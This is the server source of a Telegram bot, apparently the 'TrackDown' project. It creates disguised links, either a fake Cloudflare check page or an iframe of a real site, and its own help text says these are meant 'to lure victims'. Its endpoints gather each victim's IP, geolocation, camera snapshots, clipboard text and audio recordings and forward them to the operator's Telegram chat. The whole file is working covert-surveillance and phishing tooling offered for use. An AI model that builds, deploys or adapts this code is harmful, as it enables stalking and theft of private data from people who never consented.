const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");
const { botToken, hostURL } = require("./config");
const bot = new TelegramBot(botToken, { polling: true });
const jsonParser = bodyParser.json({
  limit: 1024 * 1024 * 20,
  type: "application/json",
});
const urlencodedParser = bodyParser.urlencoded({
  extended: true,
  limit: 1024 * 1024 * 20,
  type: "application/x-www-form-urlencoded",
});
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.set("view engine", "ejs");

//START Main Program and Never change here
app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  if (req.params.path != null) {
    res.render("webview", {
      ip: ip,
      time: d,
      url: atob(req.params.uri),
      uid: req.params.path,
    });
  } else {
    res.redirect("https://t.me/thebwof");
  }
});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  if (req.params.path != null) {
    res.render("cloudflare", {
      ip: ip,
      time: d,
      url: atob(req.params.uri),
      uid: req.params.path,
    });
  } else {
    res.redirect("https://t.me/thebwof");
  }
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
    createLink(chatId, msg.text);
  }
  if (msg.text == "/start") {
    var m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [[{ text: "Create Link", callback_data: "crenew" }]],
      }),
    };
    bot.sendMessage(
      chatId,
      `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,
      m,
    );
  } else if (msg.text == "/create") {
    createNew(chatId);
  } else if (msg.text == "/help") {
    bot.sendMessage(
      chatId,
      ` Through this bot you can track people just by sending a simple link.\n\nSend /create
to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
the url it will send you 2 links which you can use to track people.
\n\nSpecifications.
\n1. Cloudflare Link: This method will show a cloudflare under attack page to garher informations and afterwards victim will be redirected to destinationed URL.
\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
\n\nThe project is OSS at: https://github.com/TheBwof/TrackDown
`,
    );
  }
});

bot.on("callback_query", async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});
bot.on("polling_error", (error) => {
  console.log(error.code);
});

function createLink(cid, msg) {
  var encoded = [...msg].some((char) => char.charCodeAt(0) > 127);
  if (
    (msg.toLowerCase().indexOf("http") > -1 ||
      msg.toLowerCase().indexOf("https") > -1) &&
    !encoded
  ) {
    var url = cid.toString(36) + "/" + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: "Create new Link", callback_data: "crenew" }],
        ],
      }),
    };

    bot.sendMessage(
      cid,
      `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${hostURL}/c/${url}\n\n🌐 WebView Page Link\n${hostURL}/w/${url}`,
      m,
    );
  } else {
    bot.sendMessage(
      cid,
      `⚠️ Please Enter a valid URL , including http or https.`,
    );
    createNew(cid);
  }
}

function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ force_reply: true }),
  };
  bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

app.get("/", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace("T", ":");
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  res.send(ip);
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(
      parseInt(uid, 36),
      `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`,
    );
    res.send("Done");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;
  if (uid != null && img != null) {
    var buffer = Buffer.from(img, "base64");
    var info = {
      filename: "camsnap.png",
      contentType: "image/png",
    };
    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }
    res.send("Done");
  }
});
// Handle Clipboard Data
app.post("/clipboard", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const text = decodeURIComponent(req.body.text) || null;
  if (uid && text) {
    bot.sendMessage(parseInt(uid, 36), `📋 Copied Text:\n${text}`);
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});

// Handle Audio Data
app.post("/audio", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const audio = decodeURIComponent(req.body.audio) || null;
  if (uid && audio) {
    const buffer = Buffer.from(audio, "base64");
    const info = {
      filename: "audio_recording.wav",
      contentType: "audio/wav",
    };
    bot.sendAudio(parseInt(uid, 36), buffer, {}, info);
    res.send("Done");
  } else {
    res.status(400).send("Invalid data");
  }
});
app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});
